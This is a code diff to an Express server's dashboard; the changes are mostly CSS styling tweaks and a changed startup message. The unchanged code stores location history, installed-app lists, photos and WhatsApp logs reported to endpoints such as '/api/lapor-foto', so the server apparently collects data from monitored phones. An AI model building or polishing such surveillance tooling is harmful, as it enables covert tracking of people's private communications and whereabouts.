@@ -4,13 +4,11 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// Penyimpanan data sementara di memori server
 let riwayatLokasi = []; 
 let daftarAplikasi = [];
 let galeriFoto = [];
 let logWhatsApp = [];
 
-// Dashboard Berwarna & Modern
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -32,7 +30,7 @@ app.get('/', (req, res) => {
                     max-width: 900px;
                     margin: 0 auto;
                 }
-                header {
+                    header {
                     text-align: center;
                     margin-bottom: 30px;
                     color: white;
@@ -75,6 +73,8 @@ app.get('/', (req, res) => {
                     width: 100%;
                     border-collapse: collapse;
                     margin-top: 10px;
+                    overflow: hidden;
+                    border-radius: 8px;
                 }
                 th, td {
                     padding: 12px;
@@ -82,15 +82,20 @@ app.get('/', (req, res) => {
                     font-size: 13px;
                     border-bottom: 1px solid #e2e8f0;
                 }
+                
+                /* Warna Header Tabel Khusus per Kartu */
+                .card.location th { background-color: #eff6ff; color: #1d4ed8; }
+                .card.apps th { background-color: #ecfdf5; color: #047857; }
+                .card.whatsapp th { background-color: #fffbeb; color: #b45309; }
+
                 th {
-                    background-color: #f8fafc;
-                    color: #64748b;
                     font-weight: 600;
                     text-transform: uppercase;
                     font-size: 11px;
+                    letter-spacing: 0.5px;
                 }
                 tr:hover {
-                    background-color: #f1f5f9;
+                    background-color: #f8fafc;
                 }
                 .badge {
                     background-color: #dcfce7;
@@ -109,6 +114,7 @@ app.get('/', (req, res) => {
                     font-size: 12px;
                     font-weight: 500;
                     display: inline-block;
+                    box-shadow: 0 2px 4px rgba(59, 130, 246, 0.3);
                 }
                 .btn-map:hover {
                     background-color: #2563eb;
@@ -273,5 +279,5 @@ app.post('/api/lapor-foto', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Server dashboard berwarna berjalan di port ${PORT}`);
+    console.log(`Server dashboard elegan berjalan di port ${PORT}`);
 });
